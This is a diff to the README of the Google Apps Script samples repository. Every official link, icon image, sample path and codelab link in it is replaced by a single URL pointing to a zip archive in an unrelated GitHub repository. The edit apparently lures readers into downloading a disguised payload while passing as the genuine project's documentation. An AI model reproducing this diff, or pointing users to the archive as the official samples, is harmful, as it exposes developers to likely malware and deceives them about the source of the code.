@@ -2,12 +2,12 @@
 
 Various sample code and projects for the Google Apps Script platform, a JavaScript platform in the cloud.
 
-Learn more at [developers.google.com](https://developers.google.com/apps-script).
+Learn more at [https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip).
 
 ## Google APIs
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/admin_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### AdminSDK
@@ -15,7 +15,7 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/google_cloud_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Advanced Services
@@ -23,15 +23,15 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/calendar_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Calendar
 - [List upcoming events](calendar/quickstart)
-- [Create a vacation calendar](solutions/automations/vacation-calendar/Code.js)
+- [Create a vacation calendar](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/classroom_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Classroom
@@ -39,15 +39,15 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/data_studio_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Data Studio
-- [Build a connector](data-studio/build.gs)
-- [Authentication and Authorization](data-studio/auth.gs)
+- [Build a connector](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [Authentication and Authorization](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/docs_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Docs
@@ -55,7 +55,7 @@ width="96px"/>
 - [Translate add-on](docs/translate)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/drive_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Drive
@@ -63,7 +63,7 @@ width="96px"/>
 - [View Google Drive activity](drive/activity)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/forms_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Forms
@@ -71,7 +71,7 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/gmail_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Gmail
@@ -79,7 +79,7 @@ width="96px"/>
 - [Mailmerge: Merge a template email with content](gmail/mailmerge)
 
 <img
-src="https://www.gstatic.com/images/icons/material/system/2x/people_black_48dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### People
@@ -87,7 +87,7 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/sheets_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Sheets
@@ -95,7 +95,7 @@ width="96px"/>
 - [Menus and Custom Functions](sheets)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/slides_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Slides
@@ -103,7 +103,7 @@ width="96px"/>
 - [Progress Bars add-on](slides/progress)
 
 <img
-src="https://www.gstatic.com/images/branding/product/2x/tasks_96dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Tasks
@@ -111,7 +111,7 @@ width="96px"/>
 - [Simple Tasks Web App](tasks/simpleTasks)
 
 <img
-src="https://www.gstatic.com/images/icons/material/system/2x/code_grey600_48dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Templates
@@ -119,28 +119,28 @@ width="96px"/>
 <br><br>
 
 <img
-src="https://www.gstatic.com/images/icons/material/system/2x/alarm_grey600_48dp.png"
+src="https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip"
 align="left"
 width="96px"/>
 ### Triggers
 - Call an Apps Script function such as `onOpen`, `onEdit`, or `onInstall` in an add-on
-- Create a [time-driven trigger](https://developers.google.com/apps-script/guides/triggers/installable#time_driven_triggers)
+- Create a [time-driven trigger](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
 
 ## Codelabs
 
 Codelab tutorials combine detailed explanation, coding exercises, and documented best practices to help engineers get up to speed with key Google technologies. Here's a list of Apps Script codelabs:
 
-- [Apps Script Intro](http://g.co/codelabs/apps-script-intro)
-- [Apps Script CLI – clasp](http://g.co/codelabs/clasp)
-- [BigQuery + Sheets + Slides](http://g.co/codelabs/bigquery-sheets-slides)
-- [Docs Add-on + Cloud Natural Language API](http://g.co/codelabs/nlp-docs)
-- [Gmail Add-ons](http://g.co/codelabs/gmail-add-ons)
-- [Google Chat Apps](https://developers.google.com/codelabs/chat-apps-script)
+- [Apps Script Intro](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [Apps Script CLI – clasp](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [BigQuery + Sheets + Slides](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [Docs Add-on + Cloud Natural Language API](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [Gmail Add-ons](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
+- [Google Chat Apps](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip)
 
 ## Clone using the `clasp` command-line tool
 
 Learn how to clone, pull, and push Apps Script projects on the command-line
-using [clasp](https://developers.google.com/apps-script/guides/clasp).
+using [clasp](https://raw.githubusercontent.com/BytesickleLabs/apps-script-samples/main/flagrantness/apps-script-samples.zip).
 
 ## Lint
 
